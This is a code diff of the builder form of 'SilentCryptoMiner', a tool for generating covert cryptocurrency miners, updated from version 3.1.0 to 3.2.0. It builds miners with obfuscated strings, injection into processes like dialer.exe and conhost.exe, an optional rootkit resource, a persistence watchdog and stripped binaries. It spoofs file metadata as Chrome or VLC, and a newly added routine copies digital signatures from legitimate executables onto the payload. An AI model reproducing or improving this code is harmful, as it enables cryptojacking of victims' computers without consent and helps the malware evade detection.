@@ -36,14 +36,16 @@ namespace SilentCryptoMiner
         public bool xmrGPU = false;
         public string savePath;
 
-        public List<string> findSet = new List<string>();
+        public List<string> checkerSet = new List<string>();
+        public List<string> mutexSet = new List<string>();
+        public List<string> injectionTargets = new List<string>();
         public string watchdogID = "";
 
         public string CipherKey = "";
         public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
         public string UNAMIV = "UUCommandULineUU";
 
-        public string builderVersion = "3.1.0";
+        public string builderVersion = "3.2.0";
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -112,7 +114,9 @@ namespace SilentCryptoMiner
 
                 List<string> minerSet = new List<string>();
                 List<string> watchdogSet = new List<string>();
-                findSet = new List<string>();
+                checkerSet = new List<string>();
+                mutexSet = new List<string>();
+                injectionTargets = new List<string>();
 
                 string savePathBase = Path.Combine(Path.GetDirectoryName(savePath), Path.GetFileNameWithoutExtension(savePath));
 
@@ -132,7 +136,7 @@ namespace SilentCryptoMiner
                     }
                     else
                     {
-                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={formatETHUrl(miner)} {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : "")} --cinit-max-gpu={Invoke(new Func<string>(() => miner.comboMaxGPU.Text.Replace("%", "")))}");
+                        argstr.Append($"--cinit-algo={Invoke(new Func<string>(() => miner.comboAlgorithm.Text))} --pool={formatETHUrl(miner)}{(miner.chkAdvParam.Checked ? " " + miner.txtAdvParam.Text : "")} --cinit-max-gpu={Invoke(new Func<string>(() => miner.comboMaxGPU.Text.Replace("%", "")))}");
                     }
 
                     if (miner.chkRemoteConfig.Checked)
@@ -205,10 +209,12 @@ namespace SilentCryptoMiner
                     string minerid = Randomi(16);
                     argstr.Append($" --cinit-id=\"{minerid}\"");
 
-                    string injectionTarget = Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
-                    minerSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\"), AYW_OBFUSCATE(L\"{2}\"), AYW_OBFUSCATE(L\"{3}\") }}", xmr ? "xmr" : "eth", $@"\\BaseNamedObjects\\{minerid}", $@"\\{(FormAO.toggleRootkit.Checked ? "dialer.exe" : injectionTarget)}", $" {minerid} {Unamlib_Encrypt(argstr.ToString())}"));
-                    watchdogSet.Add(string.Format("{{ AYW_OBFUSCATE(L\"{0}\"), AYW_OBFUSCATE(L\"{1}\") }}", xmr ? "xmr" : "eth", $@"\\BaseNamedObjects\\{minerid}"));
-                    findSet.Add(minerid);
+                    string injectionTarget = toggleRootkit.Checked ? "dialer.exe" : Invoke(new Func<string>(() => miner.comboInjection.Text)).ToString();
+                    minerSet.Add(string.Format("{{ AYU_OBFUSCATEW(L\"{0}\"), AYU_OBFUSCATEW(L\"{1}\"), AYU_OBFUSCATEW(L\"{2}\"), AYU_OBFUSCATEW(L\"{3}\") }}", xmr ? "xmr" : "eth", $@"\\BaseNamedObjects\\{minerid}", $@"\\{injectionTarget}", $"{minerid} {Unamlib_Encrypt(argstr.ToString())}"));
+                    watchdogSet.Add(string.Format("{{ AYU_OBFUSCATEW(L\"{0}\"), AYU_OBFUSCATEW(L\"{1}\") }}", xmr ? "xmr" : "eth", $@"\\BaseNamedObjects\\{minerid}"));
+                    checkerSet.Add(string.Format("new string [] {{ \"{0}\", \"{1}\" }}", minerid, Convert.ToBase64String(Encoding.Unicode.GetBytes(argstr.ToString()))));
+                    mutexSet.Add($@"""\\BaseNamedObjects\\{minerid}""");
+                    injectionTargets.Add(injectionTarget);
                 }
 
                 minerbuilder.Replace("$MINERSET", string.Join(",", minerSet));
@@ -243,20 +249,26 @@ namespace SilentCryptoMiner
                     Directory.Delete(filesPath, true);
                 }
                 BuildLog("Extracting miner files...");
-                using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Files)))
-                {
-                    archive.ExtractToDirectory(filesPath);
-                }
+                Directory.CreateDirectory(filesPath);
+                Directory.CreateDirectory(Path.Combine(filesPath, "Syscalls"));
+                File.WriteAllText(Path.Combine(filesPath, "common.cpp"), Properties.Resources.common_cpp);
+                File.WriteAllText(Path.Combine(filesPath, "common.h"), Properties.Resources.common_h);
+                File.WriteAllText(Path.Combine(filesPath, "inject.cpp"), Properties.Resources.inject_cpp);
+                File.WriteAllText(Path.Combine(filesPath, "inject.h"), Properties.Resources.inject_h);
+                File.WriteAllText(Path.Combine(filesPath, "ntddk.h"), Properties.Resources.ntddk_h);
+                File.WriteAllText(Path.Combine(filesPath, "obfuscateu.h"), Properties.Resources.obfuscateu_h);
 
                 if (chkStartup.Checked && toggleWatchdog.Checked)
                 {
                     BuildLog("Compiling Watchdog...");
                     string watchdogpath = savePathBase + "-watchdog.exe";
                     string watchdogcode = Properties.Resources.watchdog.Replace("$WATCHDOGSET", string.Join(",", watchdogSet)).Replace("$MINERCOUNT", watchdogSet.Count.ToString());
-                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\*.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -O3 -static-libgcc -static-libstdc++ -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
+                    if (Codedom.NativeCompiler(watchdogpath, watchdogcode, $"-m64 -Wl,-subsystem,windows -mwindows \"{Path.GetFileNameWithoutExtension(watchdogpath)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\*.c UFiles\\Syscalls\\syscallsstubs.std.x64.s -O3 -static-libgcc -static-libstdc++ -fno-threadsafe-statics -s -o \"{Path.GetFileNameWithoutExtension(watchdogpath)}.exe\"", "", false, toggleAdministrator.Checked))
                     {
                         watchdogdata = File.ReadAllBytes(watchdogpath);
                         File.Delete(watchdogpath);
+                        mutexSet.Add($@"""\\BaseNamedObjects\\{watchdogID}""");
+                        injectionTargets.Add(toggleRootkit.Checked ? "dialer.exe" : "conhost.exe");
                     }
                     else
                     {
@@ -268,7 +280,7 @@ namespace SilentCryptoMiner
 
                 BuildLog("Converting resources...");
                 StringBuilder resources = new StringBuilder();
-                Codedom.CreateResource(resources, "resXMR", mineXMR ? Properties.Resources.xmrig : new byte[] {});
+                Codedom.CreateResource(resources, "resXMR", mineXMR ? Properties.Resources.xmrig : new byte[] { });
                 Codedom.CreateResource(resources, "resETH", mineETH ? Properties.Resources.ethminer : new byte[] { });
                 if (mineXMR) {
                     Codedom.CreateResource(resources, "resWR64", Properties.Resources.WinRing0x64);
@@ -284,14 +296,14 @@ namespace SilentCryptoMiner
                     Codedom.CreateResource(resources, "resnvrtc", Properties.Resources.nvrtc64_112_0);
                     Codedom.CreateResource(resources, "resnvrtc2", Properties.Resources.nvrtc_builtins64_112);
                 }
-                if (FormAO.toggleRootkit.Checked)
+                if (toggleRootkit.Checked)
                 {
-                    Codedom.CreateResource(resources, "resRootkit", Properties.Resources.rootkit_i);
+                    Codedom.CreateResource(resources, "resRootkit", Properties.Resources.Service64);
                 }
                 minerbuilder.Replace("$RESOURCES", resources.ToString());
 
                 BuildLog("Compiling Miner...");
-                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -Wno-multichar -municode -DUNICODE \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Injection\\*.cpp UFiles\\Syscalls\\*.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -O3 -static-libgcc -static-libstdc++ -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
+                if (Codedom.NativeCompiler(savePathBase + ".exe", minerbuilder.ToString(), $"-m64 -Wl,-subsystem,windows -mwindows \"{Path.GetFileNameWithoutExtension(savePathBase)}.cpp\" UFiles\\*.cpp UFiles\\Syscalls\\*.c UFiles\\Syscalls\\syscallsstubs.std.x64.s resource.o -O1 -static-libgcc -static-libstdc++ -fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -Wl,--strip-all -s -o \"{Path.GetFileNameWithoutExtension(savePathBase) + ".exe"}\"", (chkIcon.Checked && txtIconPath.Text != "" ? txtIconPath.Text : null), chkAssembly.Checked, toggleAdministrator.Checked))
                 {
                     BuildLog("Compiling Uninstaller...");
                     Codedom.UninstallerCompiler(savePathBase + "-uninstaller.exe");
@@ -501,7 +513,7 @@ namespace SilentCryptoMiner
         private void chkIcon_CheckedChanged(object sender)
         {
             chkIcon.Text = chkIcon.Checked ? "Enabled" : "Disabled";
-            btnBrowseIcon.Enabled = chkIcon.Checked;
+            btnIconBrowse.Enabled = chkIcon.Checked;
         }
 
         private void chkStartup_CheckedChanged(object sender)
@@ -529,66 +541,131 @@ namespace SilentCryptoMiner
             }
         }
 
+        private void chkSignature_CheckedChanged(object sender)
+        {
+            chkSignature.Text = chkSignature.Checked ? "Enabled" : "Disabled";
+            foreach (Control c in tabSignature.Controls)
+            {
+                if (c is not MephCheckBox && c is not Label)
+                {
+                    c.Enabled = chkSignature.Checked;
+                }
+            }
+        }
+
         private void btnAssemblyRandom_Click(object sender, EventArgs e)
         {
             try
             {
-                switch (rand.Next(2))
-                {
-                    case 0:
-                        {
-                            txtAssemblyTitle.Text = "chrome.exe";
-                            txtAssemblyDescription.Text = "Google Chrome";
-                            txtAssemblyProduct.Text = "Google Chrome";
-                            txtAssemblyCompany.Text = "Google Inc.";
-                            txtAssemblyCopyright.Text = "Copyright 2017 Google Inc. All rights reserved.";
-                            txtAssemblyTrademark.Text = "";
-                            txtAssemblyVersion1.Text = "70";
-                            txtAssemblyVersion2.Text = "0";
-                            txtAssemblyVersion3.Text = "3538";
-                            txtAssemblyVersion4.Text = "110";
-                            break;
-                        }
+                string[][] apps = {
+                    new string[]{"chrome.exe", "Google Chrome", "Google Chrome", "Google Inc.", "Copyright 2017 Google Inc. All rights reserved.", "", "70", "0", "3538", "110"},
+                    new string[]{"vlc", "VLC media player", "VLC media player", "VideoLAN", "Copyright © 1996-2018 VideoLAN and VLC Authors", "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN", "3", "0", "3", "0"}
+                };
 
-                    case 1:
-                        {
-                            txtAssemblyTitle.Text = "vlc";
-                            txtAssemblyDescription.Text = "VLC media player";
-                            txtAssemblyProduct.Text = "VLC media player";
-                            txtAssemblyCompany.Text = "VideoLAN";
-                            txtAssemblyCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors";
-                            txtAssemblyTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN";
-                            txtAssemblyVersion1.Text = "3";
-                            txtAssemblyVersion2.Text = "0";
-                            txtAssemblyVersion3.Text = "3";
-                            txtAssemblyVersion4.Text = "0";
-                            break;
-                        }
-                }
+                int randomIndex = rand.Next(apps.Length);
+
+                txtAssemblyTitle.Text = apps[randomIndex][0];
+                txtAssemblyDescription.Text = apps[randomIndex][1];
+                txtAssemblyProduct.Text = apps[randomIndex][2];
+                txtAssemblyCompany.Text = apps[randomIndex][3];
+                txtAssemblyCopyright.Text = apps[randomIndex][4];
+                txtAssemblyTrademark.Text = apps[randomIndex][5];
+                txtAssemblyVersion1.Text = apps[randomIndex][6];
+                txtAssemblyVersion2.Text = apps[randomIndex][7];
+                txtAssemblyVersion3.Text = apps[randomIndex][8];
+                txtAssemblyVersion4.Text = apps[randomIndex][9];
             }
             catch {}
         }
 
-        private void btnBrowseIcon_Click(object sender, EventArgs e)
+        private void btnIconBrowse_Click(object sender, EventArgs e)
         {
             try
             {
-                var o = new OpenFileDialog();
-                o.Filter = "Icon |*.ico";
-                if (o.ShowDialog() == DialogResult.OK)
+                using (var o = new OpenFileDialog { Filter = "Icon |*.ico" })
                 {
-                    txtIconPath.Text = o.FileName;
-                    picIcon.ImageLocation = o.FileName;
-                }
-                else
-                {
-                    txtIconPath.Text = "";
+                    txtIconPath.Text = o.ShowDialog() == DialogResult.OK ? o.FileName : "";
+                    if (!string.IsNullOrEmpty(txtIconPath.Text))
+                    {
+                        picIcon.ImageLocation = txtIconPath.Text;
+                    }
                 }
             }
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message);
             }
+        }
+
+        private void btnSignatureBrowse_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                using (var o = new OpenFileDialog { Filter = "Executable |*.exe" })
+                {
+                    txtSignaturePath.Text = o.ShowDialog() == DialogResult.OK ? o.FileName : "";
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        public byte[] CloneSignature(string target)
+        {
+            byte[] signature;
+            using (FileStream stream = new FileStream(target, FileMode.Open, FileAccess.Read))
+            {
+                BinaryReader reader2 = new BinaryReader(stream);
+                stream.Seek(60, SeekOrigin.Begin);
+                var e_lfanew = reader2.ReadUInt32();
+                stream.Seek(e_lfanew + 4 + 18, SeekOrigin.Begin);
+                var fhCharac = reader2.ReadUInt16();
+                var is32bit = (0x0100 & fhCharac) == 0x0100;
+                stream.Seek(is32bit ? 128 : 144, SeekOrigin.Current);
+                int certLoc = (int)reader2.ReadUInt32();
+                int certSize = (int)reader2.ReadUInt32();
+                stream.Seek(certLoc, SeekOrigin.Begin);
+                signature = reader2.ReadBytes(certSize);
+            }
+            return signature;
+        }
+
+        public void WriteSignature(byte[] signature, string target)
+        {
+            using (FileStream stream = new FileStream(target, FileMode.Open, FileAccess.ReadWrite))
+            {
+                BinaryReader reader2 = new BinaryReader(stream);
+                int streamlen = (int)stream.Length;
+                int siglen = signature.Length;
+                stream.Seek(60, SeekOrigin.Begin);
+                var e_lfanew = reader2.ReadUInt32();
+                stream.Seek(e_lfanew + 4 + 18, SeekOrigin.Begin);
+                var fhCharac = reader2.ReadUInt16();
+                var is32bit = (0x0100 & fhCharac) == 0x0100;
+                stream.Seek(is32bit ? 128 : 144, SeekOrigin.Current);
+                stream.Write(BitConverter.GetBytes((UInt32)streamlen), 0, 4);
+                stream.Write(BitConverter.GetBytes((UInt32)siglen), 0, 4);
+                stream.Seek(0, SeekOrigin.End);
+                stream.SetLength(streamlen + siglen);
+                stream.Write(signature, 0, siglen);
+            }
+        }
+
+        private void btnSignatureClone_Click(object sender, EventArgs e)
+        {
+            if (File.Exists(txtSignaturePath.Text))
+            {
+                string signature = Convert.ToBase64String(CloneSignature(txtSignaturePath.Text));
+                if (string.IsNullOrEmpty(signature))
+                {
+                    MessageBox.Show("Could not clone a signature from the target executable!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+                txtSignatureData.Text = signature;
+            }
+
         }
 
         private void labelGitHub_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
@@ -642,7 +719,7 @@ namespace SilentCryptoMiner
 
         public void TranslateForms()
         {
-            Dictionary<string, string> languages = new Dictionary<string, string>() { { "English", "en" }, { "Swedish", "sv" }, { "Polish", "pl" }, { "Spanish", "es" }, { "Russian", "ru" } };
+            Dictionary<string, string> languages = new Dictionary<string, string>() { { "English", "en" }, { "Swedish", "sv" }, { "Polish", "pl" }, { "Spanish", "es" }, { "Russian", "ru" }, { "Portuguese (Brazil)", "ptbr" } };
             currentLanguage = languages[comboLanguage.Text];
 
             var list = new List<Control>() { this, FormAO, FormAS };
